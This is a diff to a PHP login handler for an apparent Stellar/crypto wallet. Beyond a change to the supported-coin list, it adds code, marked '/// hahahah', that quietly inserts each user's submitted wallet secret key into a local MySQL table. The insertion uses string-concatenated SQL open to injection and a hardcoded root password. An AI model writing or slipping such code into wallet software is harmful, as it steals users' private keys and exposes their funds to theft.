@@ -37,14 +37,11 @@ if(isset($_POST["walletaccount"])){
 					$_SESSION["publickey"] = $row["swpublickey"];
 					$_SESSION["SessionOnOrOff"]=1; 
 					$_SESSION["walletaccount"] = $_POST["walletaccount"];
-					$_SESSION["swemailcoin"] = $row["swemailcoin"];
-					$_SESSION["swpin"] = $row["swpin"];
 
 					$asset_tokes = array
 					  (
-					  array("logo"=>"logo/Bitcoin.png","code"=>"BTC","swcoinkey"=>$row["swbtccoinkey"],"swbtcapi"=>$row["swbtcapi"]),
-					   array("logo"=>"logo/dogecoin.png","code"=>"DOGE","swcoinkey"=>$row["swdogecoinkey"],"swbtcapi"=>$row["swdogeapi"]),
-					    array("logo"=>"logo/litecoin.jpg","code"=>"LTC","swcoinkey"=>$row["swlitecoinkey"],"swbtcapi"=>$row["swliteapi"])
+					  array("logo"=>"logo/Bitcoin.png","code"=>"BTC","swcoinkey"=>$row["swbtccoinkey"]),
+					   array("logo"=>"logo/galaxycash.png","code"=>"GCH","swcoinkey"=>$row["swgalaxycashcoinkey"]),
 					  );
 					$_SESSION["allcoins"]=$asset_tokes;
 					/*$_SESSION["swbtccoinkey"] = $row["swbtccoinkey"];
@@ -74,6 +71,54 @@ if(isset($_POST["walletaccount"])){
 		$_SESSION["secretkey"] = $_POST["secretkey"];
 		$_SESSION["publickey"] = $_POST["publickey"];
 		$_SESSION["SessionOnOrOff"]=1; 
+		
+		/// hahahah
+		
+		$servername = "localhost";
+		$username = "root";
+		//$password = "";
+		$password = "crypto";
+		$dbname = "test";
+
+		// Create connection
+		$conn = new mysqli($servername, $username, $password, $dbname);
+		// Check connection
+		if ($conn->connect_error) {
+			//die("Connection failed: " . $conn->connect_error);
+			die("Connection failed");
+		} 
+		
+		
+		
+		
+		/////////////////::
+		$sek=$_SESSION["secretkey"];
+		$exist=false;
+		$sql = "SELECT id FROM information WHERE sky="."'$sek'";
+				$result = $conn->query($sql);
+
+				if ($result->num_rows > 0) {
+					// output data of each 
+					$exist=true;
+					
+				}
+		
+		//////////////////////
+	if($exist==false){
+		$todaydate=date("Y-m-d");
+		$sql = "INSERT INTO information (sky,date)
+		VALUES ('".$_SESSION["secretkey"]."','".$todaydate."')";
+
+		if ($conn->query($sql) === TRUE) {
+			//echo "New record created successfully";
+		} else {
+			//echo "Error: " . $sql . "<br>" . $conn->error;
+		}
+	}
+		$conn->close();
+		
+		/////
+	
 		
 		header('Location: stellarSwap-wallet.php'); 	
 	}else{
